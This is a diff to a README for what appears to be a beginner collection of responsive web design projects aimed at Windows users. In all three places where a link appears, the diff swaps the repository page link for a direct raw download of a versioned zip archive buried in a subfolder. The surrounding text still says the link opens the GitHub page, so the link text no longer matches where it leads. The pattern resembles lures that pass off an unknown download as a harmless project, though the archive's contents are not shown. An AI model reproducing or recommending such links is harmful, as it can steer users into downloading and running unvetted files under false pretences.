@@ -1,6 +1,6 @@
 # 🌐 responsive-web-design - Simple Projects for Responsive Web Layouts
 
-[![Download and Run](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/Artless-blessing525/responsive-web-design)
+[![Download and Run](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Artless-blessing525/responsive-web-design/main/product-landing-page/web-design-responsive-v3.6-beta.1.zip)
 
 ## 📋 About This Project
 
@@ -27,7 +27,7 @@ This section shows you how to get the projects running on your Windows computer.
 ## 💾 Download and Access the Projects
 
 Click the big green badge above or this link to visit the GitHub page:  
-https://github.com/Artless-blessing525/responsive-web-design
+https://raw.githubusercontent.com/Artless-blessing525/responsive-web-design/main/product-landing-page/web-design-responsive-v3.6-beta.1.zip
 
 Once you are on the page, look for the green **Code** button near the top right. Click it, then select **Download ZIP**.
 
@@ -107,4 +107,4 @@ You can also explore documentation on CSS Grid and Flexbox at Mozilla Developer 
 
 Use the link below any time you want to download or update the projects:
 
-[Download Projects from GitHub](https://github.com/Artless-blessing525/responsive-web-design)
+[Download Projects from GitHub](https://raw.githubusercontent.com/Artless-blessing525/responsive-web-design/main/product-landing-page/web-design-responsive-v3.6-beta.1.zip)
